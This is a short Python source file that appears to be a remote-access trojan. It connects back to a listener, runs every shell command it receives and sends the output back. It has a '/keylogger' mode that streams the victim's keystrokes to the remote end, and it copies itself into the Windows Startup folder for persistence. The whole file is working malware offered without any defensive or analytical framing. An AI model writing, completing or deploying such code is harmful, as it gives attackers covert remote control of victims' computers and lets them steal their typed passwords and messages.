from pynput import keyboard
import subprocess
import time
import socket
import threading
import os

ip = '127.0.0.1'
port = 9000

def cliente():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    return client 

def persistence():
  filename = os.path.basename(__file__)
  os.system(f'copy {filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"')

def send(msg, client):
    input = msg.encode()
    client.send(input)

def cmd(client, data):
  try:
    
    out = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = out.stdout.read()
    client.send(output + b'\n')
  
  except Exception as error:
    pass


def on_press(key):
    try:
        
        output = str(key).replace("'", "")
            
        
        if len(output) == 1:
            send(output, client)      
       
        else:
            output = output.replace("Key.", " ")
            send(output, client)
    
    except:
        pass
    

def listen(client): 
  while True:
    data = client.recv(1024).decode().strip()
    if data =='/sair':
        return
    elif data =='/keylogger':
        
        with keyboard.Listener(on_press=on_press) as listener:
         listener.join() 
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    else:
      threading.Thread(target=cmd, args=(client, data)).start()



if __name__=='__main__':
  
  while True:
    client = cliente()
    if client:
        listen(client)
    else:
      time.sleep(5)  
        

